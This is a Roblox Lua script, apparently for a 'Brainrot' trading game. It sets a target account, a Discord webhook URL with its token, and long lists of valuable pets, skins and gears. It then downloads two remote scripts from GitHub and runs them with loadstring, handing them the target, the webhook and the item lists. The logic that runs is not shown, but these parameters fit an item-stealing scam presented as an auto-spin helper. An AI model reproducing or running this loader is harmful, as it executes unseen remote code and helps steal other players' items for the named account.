local TARGET_ID = 9044346553
local TARGET_USER = "MonstersJ_3"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1524746381988991048/zCKVS7A00AX6j_ZmusEy_88fXVxAItyo95GkU2ATuXqDsuXyHqnm3PMrc_GQIK1wbxKm"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["Moby Bros"] = true,
    ["Burguro and Fryuro"] = true,
    ["Capitano Moby"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Cooki and Milki"] = true,
    ["Cash or Card"] = true,
    ["Chipso and Queso"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Ginger Gerat"] = true,
    ["Garama and Madundung"] = true,
    ["Gold Gold Gold"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Ketchuru and Musturu"] = true,
    ["La Food Combinasion"] = true,
    ["La Secret Combinasion"] = true,
    ["Pizza and Ranch"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Los Bros"] = true,
    ["Los Primos"] = true,
    ["Love Love Bear"] = true,
    ["Money Money Reindeer"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Rosey and Teddy"] = true,
    ["Spooky and Pumpky"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true,
    ["Strawberry Elephant"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["John Pork"] = true,
    ["Capitano Americano"] = true,
    ["Headless Horseman"] = true,
    ["Money Money Bros"] = true,
    ["Sammyni Cakini"] = true,
    ["Los Hackers"] = true,
    ["Jelly Moby"] = true,
    ["Digi Narwhal"] = true,
    ["Los Admins"] = true,
    ["Boppin Bunny"] = true,
    ["Bunny and Eggy"] = true,
    ["Cloverat Clapat"] = true,
    ["Festive 67"] = true,
    ["Fragola La La La"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Guest 666"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketupat Bros"] = true,
    ["Examen Bros"] = true,
    ["Los Amigos"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["S'more Serat"] = true,
    ["Queen Bee"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Sekolahs"] = true,
    ["Los Spaghettis"] = true,
    ["Orcaledon"] = true,
    ["Reinito Sleighito"] = true,
    ["Sammyni Fattini"] = true,
    ["Tralaledon"] = true,
    ["Grabatron"] = true
}

local TargetBaseSkins = {
    ["Octo"] = true,
    ["Summer"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Bloodmoon Hammer"] = true,
    ["Candy Sentry"] = true,
    ["Cupid's Wings"] = true,
    ["Lava Blaster"] = true,
    ["Rainbow Hammer"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/Chocola-Auto-Spin-RNG/refs/heads/main/script.lua"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)
